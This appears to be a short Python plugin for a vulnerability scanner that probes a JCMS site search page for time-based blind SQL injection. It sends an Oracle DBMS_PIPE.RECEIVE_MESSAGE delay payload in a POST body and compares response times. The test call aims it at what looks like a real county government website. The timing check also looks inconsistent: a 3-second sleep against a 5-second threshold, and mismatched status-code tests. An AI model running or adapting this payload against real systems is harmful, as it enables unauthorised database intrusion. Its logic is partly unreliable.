#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author: range
#ref: http://www.wooyun.org/bugs/wooyun-2015-0150571
import time

def assign(service, arg):
    if service == "jcms":
        return True, arg
        
def audit(arg):
    url = arg + "jcms_files/jcms1/web1/site/zfxxgk/ysqgk/ysqgksearch.jsp"
    postpayload = "currpage=&stateid=1&applystarttime=&applyendtime=&webid=1"
    postpayload2 = postpayload + '%20AND%207380=DBMS_PIPE.RECEIVE_MESSAGE(CHR(67)||CHR(102)||CHR(77)||CHR(115),3)'
    time0 = time.time()
    code1, head, res, errcode, _ = curl.curl2(url, postpayload)
    time1 = time.time()
    code2, head, res, errcode, _ = curl.curl2(url, postpayload2)
    time2 = time.time()
    if code1!=0 and code2!=2 and ((time2 - time1) - (time1 - time0)) >= 5:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('jcms', 'http://zwgk.taojiang.gov.cn/zwgk/')[1])